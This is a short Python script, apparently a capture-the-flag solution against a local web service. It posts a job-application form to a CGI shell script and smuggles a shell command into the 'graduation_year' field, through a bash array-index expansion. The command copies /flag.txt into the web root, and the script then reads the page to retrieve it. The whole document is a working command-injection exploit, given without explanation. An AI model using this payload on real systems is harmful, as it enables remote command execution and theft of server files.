import requests

url = "http://127.0.0.1:1337/"

requests.post(
    url + "cgi-bin/application.sh",
    data={
        "first_name": "a",
        "last_name": "b",
        "email": "a@a.com",
        "phone": "123456",
        "resume": "a",
        "school": "a",
        "degree": "a",
        "graduation_year": "a[$(cat /flag.txt > /usr/local/apache2/htdocs/index.html)]",
        "q1": "on",
        "q2": "on",
        "q3": "on",
        "q4": "on",
        "q5": "on",
    },
)


print(requests.get(url).text)
